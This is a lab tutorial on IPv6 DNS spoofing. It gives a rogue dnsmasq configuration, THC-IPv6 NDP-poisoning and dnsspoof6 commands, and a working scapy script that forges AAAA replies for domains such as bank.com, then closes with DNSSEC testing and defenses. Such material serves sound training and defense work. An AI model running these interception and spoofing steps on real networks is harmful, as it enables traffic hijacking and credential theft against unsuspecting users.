# How to Perform IPv6 DNS Spoofing in Lab Environments

Author: [nawazdhandala](https://www.github.com/nawazdhandala)

Tags: IPv6, DNS Spoofing, Security Testing, Lab, DNS Cache Poisoning, Network Security

Description: A guide to performing IPv6 DNS spoofing attacks in authorized lab environments to understand DNS security vulnerabilities and test DNSSEC effectiveness.

IPv6 DNS spoofing involves intercepting DNS queries and returning forged responses that map domain names to attacker-controlled IPv6 addresses. This guide demonstrates the technique in isolated lab environments to help security teams understand the attack and validate defenses like DNSSEC.

**Warning**: DNS spoofing on production networks is illegal. Only perform in isolated lab environments with explicit authorization.

## DNS Spoofing Attack Flow

```text
Victim                  Attacker              Legitimate DNS
  |                        |                        |
  |-- DNS query A/AAAA --> |                        |
  |                        | (intercepts query)     |
  |<-- Forged AAAA reply - |                        |
  |                        |                        |
  | (connects to attacker-controlled server)        |
```

## Prerequisites

For DNS spoofing to work, the attacker must be able to intercept the victim's DNS traffic - either through MITM position (NDP cache poisoning) or by running a rogue DNS server.

## Method 1: Rogue DNS Server with dnsmasq

Run a fake DNS server that returns controlled AAAA records:

```bash
# Install dnsmasq on the attacker machine

sudo apt-get install dnsmasq

# Configure dnsmasq to return controlled IPv6 addresses
cat > /etc/dnsmasq-attacker.conf << 'EOF'
# Listen on attacker's IPv6 address
listen-address=2001:db8::attacker

# Return controlled AAAA records
address=/example.com/2001:db8::evil-server
address=/bank.com/2001:db8::evil-server

# Forward other queries to real DNS
server=2001:4860:4860::8888
EOF

sudo dnsmasq -C /etc/dnsmasq-attacker.conf --no-daemon
```

## Method 2: DNS Spoofing with dnsspoof6

```bash
# Using the THC-IPv6 toolkit's DNS spoofing tool
# First establish MITM position (NDP poisoning)
sudo sysctl -w net.ipv6.conf.all.forwarding=1
sudo parasite6 eth0 2001:db8::victim &

# Then spoof DNS responses
sudo dnsspoof6 -i eth0 -f dns-spoof.txt

# dns-spoof.txt format:
# example.com AAAA 2001:db8::evil-server
# bank.com AAAA 2001:db8::evil-server
```

## Method 3: Using scapy for Custom DNS Responses

```python
from scapy.all import *
from scapy.layers.dns import *
from scapy.layers.inet6 import *

def spoof_dns(pkt):
    if pkt.haslayer(DNS) and pkt[DNS].qr == 0:
        query = pkt[DNS].qd.qname.decode()
        if "example.com" in query:
            # Forge AAAA response
            spoofed = IPv6(src=pkt[IPv6].dst, dst=pkt[IPv6].src) / \
                      UDP(sport=53, dport=pkt[UDP].sport) / \
                      DNS(
                          id=pkt[DNS].id,
                          qr=1, aa=1, qd=pkt[DNS].qd,
                          an=DNSRR(rrname=query, type="AAAA",
                                   rdata="2001:db8::evil-server", ttl=300)
                      )
            send(spoofed, iface="eth0", verbose=0)

# Sniff DNS queries and respond with forged answers
sniff(iface="eth0", filter="udp port 53", prn=spoof_dns)
```

## Verifying the Attack

```bash
# On victim: query DNS and check returned AAAA
dig AAAA example.com @2001:db8::attacker

# Check if victim resolves to attacker's address
nslookup -type=AAAA example.com
```

## Testing DNSSEC Validation

DNSSEC prevents DNS spoofing by signing DNS records:

```bash
# Test if DNSSEC validation is working (should fail for spoofed records)
dig +dnssec AAAA dnssec-test.example.com

# Check DNSSEC validation status
# AD flag = Authenticated Data (DNSSEC validation passed)
dig AAAA cloudflare.com | grep -E "flags:|AAAA"
```

## Defenses Against DNS Spoofing

| Defense | Protection |
|---|---|
| DNSSEC | Cryptographically signs DNS records |
| DNS over HTTPS (DoH) | Encrypts DNS traffic |
| DNS over TLS (DoT) | Encrypts DNS traffic |
| DNSSEC validation on client | Rejects unsigned/invalid records |
| Static host entries | Bypass DNS for known hosts |
| Network-level DNS filtering | Force DNS through controlled servers |

```bash
# Enable DNSSEC validation in /etc/systemd/resolved.conf
[Resolve]
DNSSEC=yes
DNSOverTLS=yes
```

Understanding IPv6 DNS spoofing helps security teams verify that DNSSEC is properly implemented and that clients validate signatures, protecting against both IPv4 and IPv6 DNS attacks.
